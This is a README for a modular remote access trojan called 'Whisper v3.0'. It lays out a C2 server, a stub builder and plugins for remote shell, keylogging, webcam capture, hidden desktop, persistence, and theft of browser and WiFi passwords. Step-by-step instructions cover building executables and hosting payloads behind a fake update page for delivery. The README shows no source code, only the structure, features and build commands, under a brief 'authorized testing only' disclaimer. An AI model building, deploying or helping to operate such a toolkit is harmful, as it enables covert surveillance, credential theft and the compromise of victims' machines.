# Whisper v3.0 — Modular RAT with Plugin System

**WARNING: For authorized security testing and educational purposes ONLY.**

## Architecture

```
xxrat/
├── server.py           # C2 server with dark-themed GUI
├── builder.py          # Plugin builder GUI (select plugins, configure, build)
├── stub_generator.py   # Generates minimal stubs from selected plugins
├── stub_c.c            # <50KB native C stub (compile with MinGW/MSVC)
├── plugins/            # Plugin modules — load only what you need
│   ├── shell.py        # Remote command execution
│   ├── file_manager.py # File listing, upload, download
│   ├── screenshot.py   # Desktop screenshot
│   ├── keylogger.py    # Keystroke capture
│   ├── persistence.py  # Multi-method persistence (Win/Linux/macOS)
│   ├── browser_harvest.py # Saved passwords/cookies from Chrome, Edge, Firefox
│   ├── webcam.py       # Webcam photo capture
│   ├── wifi_harvest.py # Saved WiFi passwords (Windows)
│   └── hvnc.py         # Hidden desktop (HVNC)
├── stager.ps1          # PowerShell download cradle
└── web_server.py       # HTTP delivery server with fake update page
```

## Features

- **Modular Plugin System** — Select only the capabilities you need per stub
- **Minimal Stubs** — Python stubs as small as 3.8KB source, C stubs <50KB
- **AES-Class Encryption** — HMAC-SHA256 stream cipher with PBKDF2 key derivation
- **Multi-Method Persistence** — Run key, Startup folder, WMI (Windows); autostart, crontab (Linux); LaunchAgent (macOS)
- **Browser Harvesting** — Extract saved passwords from Chrome, Edge, Firefox
- **WiFi Harvesting** — Dump saved wireless passwords via `netsh`
- **Webcam Capture** — Single-shot photo via OpenCV
- **Hidden Desktop (HVNC)** — Create and interact with a hidden Windows desktop
- **Keylogger** — Windows native (GetAsyncKeyState) / Linux (pynput)
- **Zero Dependencies** — Core agent runs on stdlib only

## Quick Start

```
pip install pyinstaller mss pillow opencv-python cryptography
python builder.py
```

In the builder:
1. Configure C2 host/port/password
2. Check the plugins you want in your stub
3. Click **Generate .py** for source, or **Build EXE** for a compiled binary
4. Click **Start Web Server** to host the payload
5. Run `python server.py` on the controller to receive connections

## Plugin System

Each plugin in `plugins/` exports:
- `PLUGIN` dict — name, description, dependencies, size estimate
- `STUB_CODE` — raw Python code injected into the generated stub
- `get_commands()` — maps command names to handler functions

The `stub_generator.py` reads only the selected plugins and assembles a minimal agent containing just those capabilities.

## Stub Sizes

| Configuration | Source Size |
|--------------|------------|
| shell + file_manager | 3.9 KB |
| All 9 plugins | 15.6 KB |
| C stub (compiled EXE) | ~25-45 KB |

## Compiling the C Stub

MinGW: `gcc -Os -s -o stub.exe stub_c.c -lws2_32 -ladvapi32`
MSVC: `cl /O1 /GS- stub_c.c /link ws2_32.lib advapi32.lib`
